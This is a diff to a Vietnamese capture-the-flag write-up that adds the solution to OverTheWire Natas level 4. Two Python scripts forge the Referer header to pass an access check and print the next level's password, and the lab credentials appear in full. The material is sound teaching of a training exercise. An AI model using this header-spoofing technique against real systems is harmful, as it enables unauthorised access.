@@ -157,7 +157,63 @@ print(re.findall('natas4:(.*)', content))
 
 
 ***
-# Natas Level 3 Solution
+# Natas Level 4 Solution
 ***
-**URL:** [http://natas3.natas.labs.overthewire.org](http://natas3.natas.labs.overthewire.org) <br/>
+**URL:** [http://natas4.natas.labs.overthewire.org](http://natas4.natas.labs.overthewire.org) <br/>
 **Datum:** natas4-Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+Khi ta cố gắng đăng nhập, thì chỉ nhận lại message không được cho phép:
+
+```bash
+Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
+```
+
+Về cách giải quyết, bạn có thể thay đổi *Referer* bằng đoạn Python đơn giản:
+**POC:**
+
+```Python
+import requests
+import re
+
+user = 'natas4'
+pwd = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
+
+headers = {'Referer' : 'http://natas5.natas.labs.overthewire.org/'}
+
+url = 'http://%s.natas.labs.overthewire.org/' % user
+reponse = requests.get(url,auth = (user,pwd), headers = headers)
+content = reponse.text
+
+#print(content)
+print(re.findall('The password for natas5 is (.*)', content))
+```
+
+*Or this way*
+
+```Python
+import requests
+
+url = 'http://natas4.natas.labs.overthewire.org/'
+referer = 'http://natas5.natas.labs.overthewire.org/'
+
+s = requests.Session()
+s.auth = ('natas4','Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
+s.headers.update({'Referer' : referer})
+r = s.get(url)
+
+print(r.text)
+```
+
+Lấy pwd và leo tiếp thôi:
+
+```text
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+```
+
+
+
+***
+# Natas Level 5 Solution
+***
+**URL:** [http://natas5.natas.labs.overthewire.org](http://natas5.natas.labs.overthewire.org) <br/>
+**Datum:** natas5-iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
